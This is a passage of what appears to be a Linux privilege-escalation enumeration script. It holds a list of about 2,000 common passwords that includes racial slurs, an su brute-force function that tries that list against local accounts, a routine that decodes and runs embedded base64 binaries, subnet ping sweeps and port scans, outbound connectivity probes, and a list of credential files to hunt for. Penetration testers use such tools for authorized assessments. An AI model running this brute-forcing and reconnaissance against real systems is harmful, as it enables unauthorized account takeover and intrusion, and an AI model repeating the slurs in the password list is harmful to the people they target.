bullshit brooklyn tigers stephanie slayer peaches miller heaven elizabeth bulldog animal 789456 scorpio rosebud qwerty12 franklin claire american vincent testing pumpkin platinum louise kitten general united turtle marine icecream hacker darkness cristina colorado boomer alexandra steelers serenity please montana mitchell marcus lollipop jessie happy cowboy 102030 marshall jupiter jeremy gibson fucker barbara adrian 1qazxsw2 12344321 11111 startrek fishing digital christine business abcdefg nintendo genius 12qwaszx walker q1w2e3 player legend carmen booboo tomcat ronaldo people pamela marvin jackass google fender asdfghjk Password 1q2w3e4r5t zaq12wsx scotland phantom hercules fluffy explorer alexis walter trouble tester qwerty1 melanie manchester gordon firebird engineer azerty 147258 virginia tiger simpsons passion lakers james angelica 55555 vampire tiffany september private maximus loveme isabelle isabella eclipse dreamer changeme cassie badboy 123456a stanley sniper rocket passport pandora justice infinity cookies barbie xavier unicorn superstar \
stephen rangers orlando money domino courtney viking tucker travis scarface pavilion nicolas natalie gandalf freddy donald captain abcdefgh a1b2c3d4 speedy peter nissan loveyou harrison friday francis dancer 159357 101010 spitfire saturn nemesis little dreams catherine brother birthday 1111111 wolverine victory student france fantasy enigma copper bonnie teresa mexico guinness georgia california sweety logitech julian hotdog emmanuel butter beatles 11223344 tristan sydney spirit october mozart lolita ireland goldfish eminem douglas cowboys control cheyenne alex testtest stargate raiders microsoft diesel debbie danger chance asdf anything aaaaaaaa welcome1 qwert hahaha forest eternity disney denise carter alaska zzzzzz titanic shorty shelby pookie pantera england chris zachary westside tamara password123 pass maryjane lincoln willie teacher pierre michael1 leslie lawrence kristina kawasaki drowssap college blahblah babygirl avatar alicia regina qqqqqq poohbear miranda madonna florence sapphire norman hamilton greenday galaxy frankie black awesome suzuki spring qazwsxedc magnum lovers liberty gregory 232323 twilight timothy swimming super stardust sophia sharon robbie predator penelope michigan margaret jesus hawaii green brittany brenda badger a1b2c3 444444 winnie wesley voodoo skippy shithead redskins qwertyu pussycat houston horses gunner fireball donkey cherokee australia arizona 1234abcd skyline power perfect lovelove kermit kenneth katrina eugene christ thailand support special runner lasvegas jason fuckme butthead blizzard athena abigail 8675309 violet tweety spanky shamrock red123 rascal melody joanna hello1 driver bluebird biteme atlantis arnold apple alison taurus random pirate monitor maria lizard kevin hummer holland buffalo 147258369 007007 valentine roberto potter magnolia juventus indigo indian harvey duncan diamonds daniela christopher bradley bananas warcraft sunset simone renegade \
redsox philip monday mohammed indiana energy bond007 avalon terminator skipper shopping scotty savannah raymond morris mnbvcxz michele lucky lucifer kingdom karina giovanni cynthia a123456 147852 12121212 wildcats ronald portugal mike helpme froggy dragons cancer bullet beautiful alabama 212121 unknown sunflower sports siemens santiago kathleen hotmail hamster golfer future father enterprise clifford christina camille camaro beauty 55555555 vision tornado something rosemary qweasd patches magic helena denver cracker beaver basket atlanta vacation smiles ricardo pascal newton jeffrey jasmin january honey hollywood holiday gloria element chandler booger angelo allison action 99999999 target snowman miguel marley lorraine howard harmony children celtic beatrice airborne wicked voyager valentin thx1138 thumper samurai moonlight mmmmmm karate kamikaze jamaica emerald bubble brooke zombie strawberry spooky software simpson service sarah racing qazxsw philips oscar minnie lalala ironman goddess extreme empire elaine drummer classic carrie berlin asdfg 22222222 valerie tintin therock sunday skywalker salvador pegasus panthers packers network mission mark legolas lacrosse kitty kelly jester italia hiphop freeman charlie1 cardinal bluemoon bbbbbb bastard alyssa 0123456789 zeppelin tinker surfer smile rockstar operator naruto freddie dragonfly dickhead connor anaconda amsterdam alfred a12345 789456123 77777777 trooper skittles shalom raptor pioneer personal ncc1701 nascar music kristen kingkong global geronimo germany country christmas bernard benson wrestling warren techno sunrise stefan sister savage russell robinson oracle millie maddog lightning kingston kennedy hannibal garcia download dollar darkstar brutus bobby autumn webster vanilla undertaker tinkerbell sweetpea ssssss softball rafael panasonic pa55word keyboard isabel hector fisher dominic darkside cleopatra blue assassin amelia vladimir roland \
nigger national monique molly matthew1 godfather frank curtis change central cartman brothers boogie archie warriors universe turkey topgun solomon sherry sakura rush2112 qwaszx office mushroom monika marion lorenzo john herman connect chopper burton blondie bitch bigdaddy amber 456789 1a2b3c4d ultimate tequila tanner sweetie scott rocky popeye peterpan packard loverboy leonard jimmy harry griffin design buddha 1 wallace truelove trombone toronto tarzan shirley sammy pebbles natalia marcel malcolm madeline jerome gilbert gangster dingdong catalina buddy blazer billy bianca alejandro 54321 252525 111222 0000 water sucker rooster potato norton lucky1 loving lol123 ladybug kittycat fuck forget flipper fireman digger bonjour baxter audrey aquarius 1111111111 pppppp planet pencil patriots oxford million martha lindsay laura jamesbond ihateyou goober giants garden diana cecilia brazil blessing bishop bigdog airplane Password1 tomtom stingray psycho pickle outlaw number1 mylove maurice madman maddie lester hendrix hellfire happy1 guardian flamingo enter chichi 0987654321 western twister trumpet trixie socrates singer sergio sandman richmond piglet pass123 osiris monkey1 martina justine english electric church castle caesar birdie aurora artist amadeus alberto 246810 whitney thankyou sterling star ronnie pussy printer picasso munchkin morpheus madmax kaiser julius imperial happiness goodluck counter columbia campbell blessed blackjack alpha 999999999 142536 wombat wildcat trevor telephone smiley saints pretty oblivion newcastle mariana janice israel imagine freedom1 detroit deedee darren catfish adriana washington warlock valentina valencia thebest spectrum skater sheila shaggy poiuyt member jessica1 jeremiah jack insane iloveu handsome goldberg gabriela elijah damien daisy buttons blabla bigboy apache anthony1 a1234567 xxxxxxxx toshiba tommy sailor peekaboo motherfucker montreal manuel madrid kramer \
katherine kangaroo jenny immortal harris hamlet gracie fucking firefly chocolat bentley account 321321 2222 1a2b3c thompson theman strike stacey science running research polaris oklahoma mariposa marie leader julia island idontknow hitman german felipe fatcat fatboy defender applepie annette 010203 watson travel sublime stewart steve squirrel simon sexy pineapple phoebe paris panzer nadine master1 mario kelsey joker hongkong gorilla dinosaur connie bowling bambam babydoll aragorn andreas 456123 151515 wolves wolfgang turner semperfi reaper patience marilyn fletcher drpepper dorothy creation brian bluesky andre yankee wordpass sweet spunky sidney serena preston pauline passwort original nightmare miriam martinez labrador kristin kissme henry gerald garrett flash excalibur discovery dddddd danny collins casino broncos brendan brasil apple123 yvonne wonder window tomato sundance sasha reggie redwings poison mypassword monopoly mariah margarita lionking king football1 director darling bubba biscuit 44444444 wisdom vivian virgin sylvester street stones sprite spike single sherlock sandy rocker robin matt marianne linda lancelot jeanette hobbes fred ferret dodger cotton corona clayton celine cannabis bella andromeda 7654321 4444 werewolf starcraft sampson redrum pyramid prodigy paul michel martini marathon longhorn leopard judith joanne jesus1 inferno holly harold happy123 esther dudley dragon1 darwin clinton celeste catdog brucelee argentina alpine 147852369 wrangler william1 vikings trigger stranger silvia shotgun scarlett scarlet redhead raider qweasdzxc playstation mystery morrison honda february fantasia designer coyote cool bulldogs bernie baby asdfghj angel1 always adam 202020 wanker sullivan stealth skeeter saturday rodney prelude pingpong phillip peewee peanuts peace nugget newport myself mouse memphis lover lancer kristine james1 hobbit halloween fuckyou1 finger fearless dodgers delete cougar \
charmed cassandra caitlin bismillah believe alice airforce 7777 viper tony theodore sylvia suzanne starfish sparkle server samsam qweqwe public pass1234 neptune marian krishna kkkkkk jungle cinnamon bitches 741852 trojan theresa sweetheart speaker salmon powers pizza overlord michaela meredith masters lindsey history farmer express escape cuddles carson candy buttercup brownie broken abc12345 aardvark Passw0rd 141414 124578 123789 12345678910 00000 universal trinidad tobias thursday surfing stuart stinky standard roller porter pearljam mobile mirage markus loulou jjjjjj herbert grace goldie frosty fighter fatima evelyn eagle desire crimson coconut cheryl beavis anonymous andres africa 134679 whiskey velvet stormy springer soldier ragnarok portland oranges nobody nathalie malibu looking lemonade lavender hitler hearts gotohell gladiator gggggg freckles fashion david1 crusader cosmos commando clover clarence center cadillac brooks bronco bonita babylon archer alexandre 123654789 verbatim umbrella thanks sunny stalker splinter sparrow selena russia roberts register qwert123 penguins panda ncc1701d miracle melvin lonely lexmark kitkat julie graham frances estrella downtown doodle deborah cooler colombia chemistry cactus bridge bollocks beetle anastasia 741852963 69696969 unique sweets station showtime sheena santos rock revolution reading qwerasdf password2 mongoose marlene maiden machine juliet illusion hayden fabian derrick crazy cooldude chipper bomber blonde bigred amazing aliens abracadabra 123qweasd wwwwww treasure timber smith shelly sesame pirates pinkfloyd passwords nature marlin marines linkinpark larissa laptop hotrod gambit elvis education dustin devils damian christy braves baller anarchy white valeria underground strong poopoo monalisa memory lizzie keeper justdoit house homer gerard ericsson emily divine colleen chelsea1 cccccc camera bonbon billie bigfoot badass asterix anna animals \
andy achilles a1s2d3f4 violin veronika vegeta tyler test1234 teddybear tatiana sporting spartan shelley sharks respect raven pentium papillon nevermind marketing manson madness juliette jericho gabrielle fuckyou2 forgot firewall faith evolution eric eduardo dagger cristian cavalier canadian bruno blowjob blackie beagle admin123 010101 together spongebob snakes sherman reddog reality ramona puppies pedro pacific pa55w0rd omega noodle murray mollie mister halflife franco foster formula1 felix dragonball desiree default chris1 bunny bobcat asdf123 951753 5555 242424 thirteen tattoo stonecold stinger shiloh seattle santana roger roberta rastaman pickles orion mustang1 felicia dracula doggie cucumber cassidy britney brianna blaster belinda apple1 753951 teddy striker stevie soleil snake skateboard sheridan sexsex roxanne redman qqqqqqqq punisher panama paladin none lovelife lights jerry iverson inside hornet holden groovy gretchen grandma gangsta faster eddie chevelle chester1 carrot cannon button administrator a 1212 zxc123 wireless volleyball vietnam twinkle terror sandiego rose pokemon1 picture parrot movies moose mirror milton mayday maestro lollypop katana johanna hunting hudson grizzly gorgeous garbage fish ernest dolores conrad chickens charity casey blueberry blackman blackbird bill beckham battle atlantic wildfire weasel waterloo trance storm singapore shooter rocknroll richie poop pitbull mississippi kisses karen juliana james123 iguana homework highland fire elliot eldorado ducati discover computer1 buddy1 antonia alphabet 159951 123456789a 1123581321 0123456 zaq1xsw2 webmaster vagina unreal university tropical swimmer sugar southpark silence sammie ravens question presario poiuytrewq palmer notebook newman nebraska manutd lucas hermes gators dave dalton cheetah cedric camilla bullseye bridget bingo ashton 123asd yahoo volume valhalla tomorrow starlight scruffy roscoe richard1 positive \
plymouth pepsi patrick1 paradox milano maxima loser lestat gizmo ghetto faithful emerson elliott dominique doberman dillon criminal crackers converse chrissy casanova blowme attitude"
PASSTRY="2000" 

if [ "$PORTS" ] || [ "$DISCOVERY" ] || [ "$IP" ]; then MAXPATH_FIND_W="1"; fi 
SEDOVERFLOW=true
for grp in $(groups $USER 2>/dev/null | cut -d ":" -f2); do
  wgroups="$wgroups -group $grp -or "
done
wgroups="$(echo $wgroups | sed -e 's/ -or$//')"
while $SEDOVERFLOW; do
 
    WF=$(find / -maxdepth $MAXPATH_FIND_W -type d ! -path "/proc/*" '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')'  2>/dev/null | sort) 
  Wfolders=$(printf "%s" "$WF" | tr '\n' '|')"|[a-zA-Z]+[a-zA-Z0-9]* +\*"
  Wfolder="$(printf "%s" "$WF" | grep "/shm" | head -n1)"
  if ! [ "$Wfolder" ]; then
    Wfolder="$(printf "%s" "$WF" | grep "tmp\|shm\|home\|Users\|root\|etc\|var\|opt\|bin\|lib\|mnt\|private\|Applications" | head -n1)"
  fi
  printf "test\ntest\ntest\ntest"| sed -${E} "s,$Wfolders|\./|\.:|:\.,${SED_RED_YELLOW},g" >/dev/null 2>&1
  if [ $? -eq 0 ]; then
      SEDOVERFLOW=false
  else
      MAXPATH_FIND_W=$(($MAXPATH_FIND_W-1)) 
  fi
  if [ $MAXPATH_FIND_W -lt 1 ] ; then 
     SEDOVERFLOW=false
  fi
done

notExtensions="\.tif$|\.tiff$|\.gif$|\.jpeg$|\.jpg|\.jif$|\.jfif$|\.jp2$|\.jpx$|\.j2k$|\.j2c$|\.fpx$|\.pcd$|\.png$|\.pdf$|\.flv$|\.mp4$|\.mp3$|\.gifv$|\.avi$|\.mov$|\.mpeg$|\.wav$|\.doc$|\.docx$|\.xls$|\.xlsx$|\.svg$"

TIMEOUT="$(command -v timeout 2>/dev/null)"
STRACE="$(command -v strace 2>/dev/null)"
STRINGS="$(command -v strings 2>/dev/null)"

shscripsG="/0trace.sh|/alsa-info.sh|amuFormat.sh|/blueranger.sh|/crosh.sh|/dnsmap-bulk.sh|/dockerd-rootless.sh|/dockerd-rootless-setuptool.sh|/get_bluetooth_device_class.sh|/gettext.sh|/go-rhn.sh|/gvmap.sh|/kernel_log_collector.sh|/lesspipe.sh|/lprsetup.sh|/mksmbpasswd.sh|/pm-utils-bugreport-info.sh|/power_report.sh|/setuporamysql.sh|/setup-nsssysinit.sh|/readlink_f.sh|/rescan-scsi-bus.sh|/start_bluetoothd.sh|/start_bluetoothlog.sh|/testacg.sh|/testlahf.sh|/unix-lpr.sh|/url_handler.sh|/write_gpt.sh"

notBackup="/tdbbackup$|/db_hotbackup$"

cronjobsG=".placeholder|0anacron|0hourly|110.clean-tmps|130.clean-msgs|140.clean-rwho|199.clean-fax|199.rotate-fax|200.accounting|310.accounting|400.status-disks|420.status-network|430.status-rwho|999.local|anacron|apache2|apport|apt|aptitude|apt-compat|bsdmainutils|certwatch|cracklib-runtime|debtags|dpkg|e2scrub_all|exim4-base|fake-hwclock|fstrim|john|locate|logrotate|man-db.cron|man-db|mdadm|mlocate|ntp|passwd|php|popularity-contest|raid-check|rwhod|samba|standard|sysstat|ubuntu-advantage-tools|update-motd|update-notifier-common|upstart|"
cronjobsB="centreon"

processesVB='jdwp|tmux |screen | inspect |--inspect[= ]|--inspect$|--inpect-brk|--remote-debugging-port'
processesB="knockd|splunk"
processesDump="gdm-password|gnome-keyring-daemon|lightdm|vsftpd|apache2|sshd:"

mail_apps="Postfix|Dovecot|Exim|SquirrelMail|Cyrus|Sendmail|Courier"

profiledG="01-locale-fix.sh|256term.csh|256term.sh|abrt-console-notification.sh|appmenu-qt5.sh|apps-bin-path.sh|bash_completion.sh|cedilla-portuguese.sh|colorgrep.csh|colorgrep.sh|colorls.csh|colorls.sh|colorxzgrep.csh|colorxzgrep.sh|colorzgrep.csh|colorzgrep.sh|csh.local|cursor.sh|gawk.csh|gawk.sh|kali.sh|lang.csh|lang.sh|less.csh|less.sh|flatpak.sh|sh.local|vim.csh|vim.sh|vte.csh|vte-2.91.sh|which2.csh|which2.sh|xauthority.sh|Z97-byobu.sh|xdg_dirs_desktop_session.sh|Z99-cloudinit-warnings.sh|Z99-cloud-locale-test.sh"

knw_emails=".*@aivazian.fsnet.co.uk|.*@angband.pl|.*@canonical.com|.*centos.org|.*debian.net|.*debian.org|.*@jff.email|.*kali.org|.*linux.it|.*@linuxia.de|.*@lists.debian-maintainers.org|.*@mit.edu|.*@oss.sgi.com|.*@qualcomm.com|.*redhat.com|.*ubuntu.com|.*@vger.kernel.org|rogershimizu@gmail.com|thmarques@gmail.com"

timersG="anacron.timer|apt-daily.timer|apt-daily-upgrade.timer|e2scrub_all.timer|fstrim.timer|fwupd-refresh.timer|geoipupdate.timer|io.netplan.Netplan|logrotate.timer|man-db.timer|mlocate.timer|motd-news.timer|phpsessionclean.timer|plocate-updatedb.timer|snapd.refresh.timer|snapd.snap-repair.timer|systemd-tmpfiles-clean.timer|systemd-readahead-done.timer|ua-license-check.timer|ua-messaging.timer|ua-timer.timer|ureadahead-stop.timer"

commonrootdirsG="^/$|/bin$|/boot$|/.cache$|/cdrom|/dev$|/etc$|/home$|/lost+found$|/lib$|/lib32$|libx32$|/lib64$|lost\+found|/media$|/mnt$|/opt$|/proc$|/root$|/run$|/sbin$|/snap$|/srv$|/sys$|/tmp$|/usr$|/var$"
commonrootdirsMacG="^/$|/.DocumentRevisions-V100|/.fseventsd|/.PKInstallSandboxManager-SystemSoftware|/.Spotlight-V100|/.Trashes|/.vol|/Applications|/bin|/cores|/dev|/home|/Library|/macOS Install Data|/net|/Network|/opt|/private|/sbin|/System|/Users|/usr|/Volumes"

ldsoconfdG="/lib32|/lib/x86_64-linux-gnu|/usr/lib32|/usr/lib/oracle/19.6/client64/lib/|/usr/lib/x86_64-linux-gnu/libfakeroot|/usr/lib/x86_64-linux-gnu|/usr/local/lib/x86_64-linux-gnu|/usr/local/lib"

dbuslistG="^:1\.[0-9\.]+|com.hp.hplip|com.redhat.ifcfgrh1|com.redhat.NewPrinterNotification|com.redhat.PrinterDriversInstaller|com.redhat.RHSM1|com.redhat.RHSM1.Facts|com.redhat.tuned|com.ubuntu.LanguageSelector|com.ubuntu.SoftwareProperties|com.ubuntu.SystemService|com.ubuntu.USBCreator|com.ubuntu.WhoopsiePreferences|io.netplan.Netplan|io.snapcraft.SnapdLoginService|fi.epitest.hostap.WPASupplicant|fi.w1.wpa_supplicant1|NAME|org.blueman.Mechanism|org.bluez|org.debian.apt|org.fedoraproject.FirewallD1|org.fedoraproject.Setroubleshootd|org.fedoraproject.SetroubleshootFixit|org.fedoraproject.SetroubleshootPrivileged|org.freedesktop.Accounts|org.freedesktop.Avahi|org.freedesktop.bolt|org.freedesktop.ColorManager|org.freedesktop.DBus|org.freedesktop.DisplayManager|org.freedesktop.fwupd|org.freedesktop.GeoClue2|org.freedesktop.hostname1|org.freedesktop.import1|org.freedesktop.locale1|org.freedesktop.login1|org.freedesktop.machine1|org.freedesktop.ModemManager1|org.freedesktop.NetworkManager|org.freedesktop.network1|org.freedesktop.nm_dispatcher|org.freedesktop.PackageKit|org.freedesktop.PolicyKit1|org.freedesktop.portable1|org.freedesktop.realmd|org.freedesktop.RealtimeKit1|org.freedesktop.resolve1|org.freedesktop.systemd1|org.freedesktop.thermald|org.freedesktop.timedate1|org.freedesktop.timesync1|org.freedesktop.UDisks2|org.freedesktop.UPower|org.opensuse.CupsPkHelper.Mechanism"

USEFUL_SOFTWARE="authbind aws base64 ctr curl doas docker fetch g++ gcc gdb kubectl lxc make nc nc.traditional ncat netcat nmap perl php ping podman python python2 python2.6 python2.7 python3 python3.6 python3.7 rkt ruby runc socat sudo wget xterm"
TIP_DOCKER_ROOTLESS="In rootless mode privilege escalation to root will not be possible."
GREP_DOCKER_SOCK_INFOS="Architecture|OSType|Name|DockerRootDir|NCPU|OperatingSystem|KernelVersion|ServerVersion"
GREP_DOCKER_SOCK_INFOS_IGNORE="IndexConfig"
GREP_IGNORE_MOUNTS="/ /|/null | proc proc |/dev/console"

INT_HIDDEN_FILES=".bashrc|.bluemix|.cer|.cloudflared|.crt|.csr|.db|.der|.env|.erlang.cookie|.ftpconfig|.git|.git-credentials|.gitconfig|.github|.gnupg|.google_authenticator|.gpg|.htpasswd|.irssi|.jks|.k5login|.kdbx|.key|.keyring|.keystore|.keytab|.kube|.ldaprc|.lesshst|.mozilla|.msmtprc|.ovpn|.p12|.password-store|.pem|.pfx|.pgp|.plan|.profile|.psk|.pypirc|.rdg|.recently-used.xbel|.rhosts|.secrets.mkey|.service|.socket|.sqlite|.sqlite3|.sudo_as_admin_successful|.svn|.swp|.timer|.vault-token|.viminfo|.vnc|.wgetrc"

if [ "$(ps auxwww 2>/dev/null | wc -l 2>/dev/null)" -lt 8 ]; then
  NOUSEPS="1"
fi

DISCOVER_BAN_BAD="No network discovery capabilities (fping or ping not found)"
FPING=$(command -v fping 2>/dev/null)
PING=$(command -v ping 2>/dev/null)
if [ "$FPING" ]; then
  DISCOVER_BAN_GOOD="$GREEN$FPING${BLUE} is available for network discovery$LG ($SCRIPTNAME can discover hosts, learn more with -h)"
else
  if [ "$PING" ]; then
    DISCOVER_BAN_GOOD="$GREEN$PING${BLUE} is available for network discovery$LG ($SCRIPTNAME can discover hosts, learn more with -h)"
  fi
fi

SCAN_BAN_BAD="No port scan capabilities (nc and bash not found)"

if [ "$(command -v bash)" ] && ! [ -L "$(command -v bash)" ]; then
  FOUND_BASH=$(command -v bash);
elif [ -f "/bin/bash" ] && ! [ -L "/bin/bash" ]; then
  FOUND_BASH="/bin/bash";
fi
if [ "$FOUND_BASH" ]; then
  SCAN_BAN_GOOD="$YELLOW[+] $GREEN$FOUND_BASH${BLUE} is available for network discovery, port scanning and port forwarding$LG ($SCRIPTNAME can discover hosts, scan ports, and forward ports. Learn more with -h)\n"
fi

FOUND_NC=$(command -v nc 2>/dev/null)
if [ -z "$FOUND_NC" ]; then
	FOUND_NC=$(command -v netcat 2>/dev/null);
fi
if [ -z "$FOUND_NC" ]; then
	FOUND_NC=$(command -v ncat 2>/dev/null);
fi
if [ -z "$FOUND_NC" ]; then
	FOUND_NC=$(command -v nc.traditional 2>/dev/null);
fi
if [ -z "$FOUND_NC" ]; then
	FOUND_NC=$(command -v nc.openbsd 2>/dev/null);
fi
if [ "$FOUND_NC" ]; then
  SCAN_BAN_GOOD="$SCAN_BAN_GOOD$YELLOW[+] $GREEN$FOUND_NC${BLUE} is available for network discovery & port scanning$LG ($SCRIPTNAME can discover hosts and scan ports, learn more with -h)\n"
fi

echo_not_found (){
  printf $DG"$1 Not Found\n"$NC
}

warn_exec(){
  $* 2>/dev/null || echo_not_found $1
}

echo_no (){
  printf $DG"No\n"$NC
}

print_title(){
  if [ "$DEBUG" ]; then
    END_T2_TIME=$(date +%s 2>/dev/null)
    if [ "$START_T2_TIME" ]; then
      TOTAL_T2_TIME=$(($END_T2_TIME - $START_T2_TIME))
      printf $DG"This check took $TOTAL_T2_TIME seconds\n"$NC
    fi

    END_T1_TIME=$(date +%s 2>/dev/null)
    if [ "$START_T1_TIME" ]; then
      TOTAL_T1_TIME=$(($END_T1_TIME - $START_T1_TIME))
      printf $DG"The total section execution took $TOTAL_T1_TIME seconds\n"$NC
      echo ""
    fi

    START_T1_TIME=$(date +%s 2>/dev/null)
  fi

  title=$1
  title_len=$(echo $title | wc -c)
  max_title_len=80
  rest_len=$((($max_title_len - $title_len) / 2))

  printf ${BLUE}
  for i in $(seq 1 $rest_len); do printf " "; done
  printf "╔"
  for i in $(seq 1 $title_len); do printf "═"; done; printf "═";
  printf "╗"

  echo ""

  for i in $(seq 1 $rest_len); do printf "═"; done
  printf "╣ $GREEN${title}${BLUE} ╠"
  for i in $(seq 1 $rest_len); do printf "═"; done

  echo ""

  printf ${BLUE}
  for i in $(seq 1 $rest_len); do printf " "; done
  printf "╚"
  for i in $(seq 1 $title_len); do printf "═"; done; printf "═";
  printf "╝"
  
  printf $NC
  echo ""
}

print_2title(){
  if [ "$DEBUG" ]; then
    END_T2_TIME=$(date +%s 2>/dev/null)
    if [ "$START_T2_TIME" ]; then
      TOTAL_T2_TIME=$(($END_T2_TIME - $START_T2_TIME))
      printf $DG"This check took $TOTAL_T2_TIME seconds\n"$NC
      echo ""
    fi

    START_T2_TIME=$(date +%s 2>/dev/null)
  fi

  printf ${BLUE}"╔══════════╣ $GREEN$1\n"$NC 
}

print_3title(){
  printf ${BLUE}"══╣ $GREEN$1\n"$NC 
}

print_3title_no_nl(){
  printf ${BLUE}"\r══╣ $GREEN${1}..."$NC 
}

print_list(){
  printf ${BLUE}"═╣ $GREEN$1"$NC 
}

print_info(){
  printf "${BLUE}╚ ${ITALIC_BLUE}$1\n"$NC
}

print_ps (){
  (ls -d /proc/*/ 2>/dev/null | while read f; do
    CMDLINE=$(cat $f/cmdline 2>/dev/null | grep -av "seds,"); 
    if [ "$CMDLINE" ];
      then var USER2=ls -ld $f | awk '{print $3}'; PID=$(echo $f | cut -d "/" -f3);
      printf "  %-13s  %-8s  %s\n" "$USER2" "$PID" "$CMDLINE";
    fi;
  done) 2>/dev/null | sort -r
}

su_try_pwd (){
  BFUSER=$1
  PASSWORDTRY=$2
  trysu=$(echo "$PASSWORDTRY" | timeout 1 su $BFUSER -c whoami 2>/dev/null)
  if [ "$trysu" ]; then
    echo "  You can login as $BFUSER using password: $PASSWORDTRY" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  fi
}

su_brute_user_num (){
  BFUSER=$1
  TRIES=$2
  su_try_pwd "$BFUSER" "" &   
  su_try_pwd "$BFUSER" "$BFUSER" & 
  su_try_pwd "$BFUSER" "$(echo $BFUSER | rev 2>/dev/null)" & 
  if [ "$PASSWORD" ]; then
    su_try_pwd "$BFUSER" "$PASSWORD" & 
  fi
  for i in $(seq "$TRIES"); do
    su_try_pwd "$BFUSER" "$(echo $top2000pwds | cut -d ' ' -f $i)" & 
    sleep 0.007
  done
  wait
}

check_if_su_brute(){
  error=$(echo "" | timeout 1 su $(whoami) -c whoami 2>&1);
  if ! echo $error | grep -q "must be run from a terminal"; then
    echo "1"
  fi
}

eval_bckgrd(){
  eval "$1" &
  CONT_THREADS=$(($CONT_THREADS+1)); if [ "$(($CONT_THREADS%$THREADS))" -eq "0" ]; then wait; fi
}

macosNotSigned(){
  for filename in $1/*; do
    if codesign -vv -d \"$filename\" 2>&1 | grep -q 'not signed'; then
      echo "$filename isn't signed" | sed -${E} "s,.*,${SED_RED},"
    fi
  done
}

execBin(){
  TOOL_NAME=$1
  TOOL_LINK=$2
  B64_BIN=$3
  PARAMS=$4
  if [ "$B64_BIN" ]; then
    echo ""
    print_3title "Running $TOOL_NAME"
    print_info "$TOOL_LINK"
    echo "$B64_BIN" | base64 -d > $Wfolder/bin
    chmod +x $Wfolder/bin
    eval "$Wfolder/bin $PARAMS"
    rm -f $Wfolder/bin
    echo ""
  fi
}

check_tcp_80(){
  (timeout -s KILL 20 /bin/bash -c '( echo >/dev/tcp/1.1.1.1/80 && echo "Port 80 is accessible" || echo "Port 80 is not accessible") 2>/dev/null | grep "accessible"') 2>/dev/null || echo "Port 80 is not accessible"
}
check_tcp_443(){
  (timeout -s KILL 20 /bin/bash -c '(echo >/dev/tcp/1.1.1.1/443 && echo "Port 443 is accessible" || echo "Port 443 is not accessible") 2>/dev/null | grep "accessible"') 2>/dev/null || echo "Port 443 is not accessible"
}
check_icmp(){
  (timeout -s KILL 20 /bin/bash -c '(ping -c 1 1.1.1.1 | grep "1 received" && echo "Ping is available" || echo "Ping is not available") 2>/dev/null | grep "available"') 2>/dev/null || echo "Ping is not available"
}

check_dns(){
  (timeout 20 /bin/bash -c '(( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS available" || echo "DNS not available") 2>/dev/null | grep "available"' ) 2>/dev/null || echo "DNS not available"
}

basic_net_info(){
  print_title "Basic Network Info"
  (ifconfig || ip a) 2>/dev/null
  echo ""
}

select_nc (){
  NC_SCAN="$FOUND_NC -v -n -z -w 1"
  $($NC_SCAN 127.0.0.1 65321 > /dev/null 2>&1)
  if [ $? -eq 2 ]
  then
    NC_SCAN="timeout 1 $FOUND_NC -v -n"
  fi
}

icmp_recon (){
	IP3=$(echo $1 | cut -d "." -f 1,2,3)

  (timeout 1 ping -b -c 1 "$IP3.255" 2>/dev/null | grep "icmp_seq" | sed -${E} "s,[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+,${SED_RED},") &
  (timeout 1 ping -b -c 1 "255.255.255.255" 2>/dev/null | grep "icmp_seq" | sed -${E} "s,[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+,${SED_RED},") &
	for j in $(seq 0 254)
	do
    (timeout 1 ping -b -c 1 "$IP3.$j" 2>/dev/null | grep "icmp_seq" | sed -${E} "s,[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+,${SED_RED},") &
	done
  wait
}

tcp_recon (){
  IP3=$(echo $1 | cut -d "." -f 1,2,3)
	PORTS=$2
  printf ${YELLOW}"[+]${BLUE} Ports going to be scanned: $PORTS" $NC | tr '\n' " "
  printf "$NC\n"

  for port in $PORTS; do
    for j in $(seq 1 254)
    do
      if [ "$FOUND_BASH" ] && [ "$TIMEOUT" ]; then
        $TIMEOUT 2.5 $FOUND_BASH -c "(echo </dev/tcp/$IP3.$j/$port) 2>/dev/null && echo -e \"\n[+] Open port at: $IP3.$j:$port\"" &
      elif [ "$NC_SCAN" ]; then
        ($NC_SCAN "$IP3"."$j" "$port" 2>&1 | grep -iv "Connection refused\|No route\|Version\|bytes\| out" | sed -${E} "s,[0-9\.],${SED_RED},g") &
      fi
    done
    wait
  done
}

tcp_port_scan (){
  basic_net_info

  print_title "Network Port Scanning"
  IP=$1
	PORTS="$2"

  if [ -z "$PORTS" ]; then
    printf ${YELLOW}"[+]${BLUE} Ports going to be scanned: DEFAULT (nmap top 1000)" $NC | tr '\n' " "
    printf "$NC\n"
    PORTS="1 3 4 6 7 9 13 17 19 20 21 22 23 24 25 26 30 32 33 37 42 43 49 53 70 79 80 81 82 83 84 85 88 89 90 99 100 106 109 110 111 113 119 125 135 139 143 144 146 161 163 179 199 211 212 222 254 255 256 259 264 280 301 306 311 340 366 389 406 407 416 417 425 427 443 444 445 458 464 465 481 497 500 512 513 514 515 524 541 543 544 545 548 554 555 563 587 593 616 617 625 631 636 646 648 666 667 668 683 687 691 700 705 711 714 720 722 726 749 765 777 783 787 800 801 808 843 873 880 888 898 900 901 902 903 911 912 981 987 990 992 993 995 999 1000 1001 1002 1007 1009 1010 1011 1021 1022 1023 1024 1025 1026 1027 1028 1029 1030 1031 1032 1033 1034 1035 1036 1037 1038 1039 1040 1041 1042 1043 1044 1045 1046 1047 1048 1049 1050 1051 1052 1053 1054 1055 1056 1057 1058 1059 1060 1061 1062 1063 1064 1065 1066 1067 1068 1069 1070 1071 1072 1073 1074 1075 1076 1077 1078 1079 1080 1081 1082 1083 1084 1085 1086 1087 1088 1089 1090 1091 1092 1093 1094 1095 1096 1097 1098 1099 1100 1102 1104 1105 1106 1107 1108 1110 1111 1112 1113 1114 1117 1119 1121 1122 1123 1124 1126 1130 1131 1132 1137 1138 1141 1145 1147 1148 1149 1151 1152 1154 1163 1164 1165 1166 1169 1174 1175 1183 1185 1186 1187 1192 1198 1199 1201 1213 1216 1217 1218 1233 1234 1236 1244 1247 1248 1259 1271 1272 